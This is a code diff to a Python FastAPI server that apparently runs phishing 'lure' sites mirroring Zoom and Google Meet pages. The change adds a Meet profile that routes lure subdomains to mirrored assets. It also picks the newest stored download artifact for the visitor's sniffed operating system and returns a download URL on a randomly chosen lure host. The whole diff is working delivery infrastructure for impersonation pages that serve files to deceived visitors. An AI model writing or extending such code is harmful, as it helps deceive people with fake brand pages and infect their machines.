@@ -204,8 +204,8 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         return request.headers.get("host", "").split(":")[0].split(".")[0]
 
     # -- landing (lure hosts) -----------------------------------------------
-    def lure_index() -> HTMLResponse:
-        index = config.lure_dir / "index.html"
+    def lure_index(profile: str) -> HTMLResponse:
+        index = config.lure_dir_for(profile) / "index.html"
         if not index.is_file():
             return HTMLResponse(landing.page(config, {}, ""))
         html = index.read_text(encoding="utf-8", errors="ignore")
@@ -218,8 +218,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
 
     @app.get("/", response_class=HTMLResponse)
     async def dashboard(request: Request):
-        if host_prefix(request) in config.lure_hosts:
-            return lure_index()
+        prefix = host_prefix(request)
+        if prefix in config.lure_hosts or prefix in config.lure_meet_hosts:
+            return lure_index(config.profile_for_host(prefix))
         session = require(request)
         if session is None:
             return RedirectResponse("/login", status_code=303)
@@ -241,18 +242,31 @@ def create_app(settings: Settings | None = None) -> FastAPI:
 
     @app.get("/__lure/target")
     async def lure_target(request: Request, os: str = "all", ua: str = ""):
+        prefix = host_prefix(request)
+        profile = config.profile_for_host(prefix)
+        pool = config.lure_meet_hosts if profile == "meet" else config.lure_hosts
         family = landing.sniff(ua) if ua else os
         family = landing.family_for_os(family if family != "all" else os)
-        picked = landing.newest(await run_in_threadpool(app.state.pipeline.recent, 200))
+        recent = await run_in_threadpool(app.state.pipeline.recent, 300)
+
+        def art_profile(artifact: dict) -> str:
+            stored = str(artifact.get("profile") or "")
+            if stored:
+                return stored
+            name = str(artifact.get("name", "")).lower()
+            return "meet" if ("meet" in name or "google" in name) else "zoom"
+
+        matching = [a for a in recent if art_profile(a) == profile]
+        picked = landing.newest(matching)
         artifact = picked.get(family) or (next(iter(picked.values())) if picked else None)
         if artifact is None:
-            return JSONResponse({"url": "", "family": family})
+            return JSONResponse({"url": "", "family": family, "profile": profile})
         host = request.headers.get("host", config.public_host)
         zone = host.split(":", 1)[0].split(".", 1)[1] if "." in host else host
-        download_host = f"{secrets.choice(config.lure_hosts)}.{zone}"
+        download_host = f"{secrets.choice(pool)}.{zone}"
         url = f"https://{download_host}/e/{artifact['slug']}"
         return JSONResponse(
-            {"url": url, "family": family, "slug": artifact["slug"]},
+            {"url": url, "family": family, "profile": profile, "slug": artifact["slug"]},
             headers={"Cache-Control": "no-store"},
         )
 
@@ -592,9 +606,10 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     # catch-all for mirrored lure assets (/ _next/*, /sites/*, /favicon.ico, ...)
     @app.get("/{path:path}")
     async def lure_asset(path: str):
-        candidate = config.lure_dir / path
-        if candidate.is_file():
-            return FileResponse(candidate)
+        for base in (config.lure_dir, config.lure_meet_dir, config.lure_dir.parent):
+            candidate = base / path
+            if candidate.is_file():
+                return FileResponse(candidate)
         raise HTTPException(status_code=404, detail=f"no {path}")
 
     return app
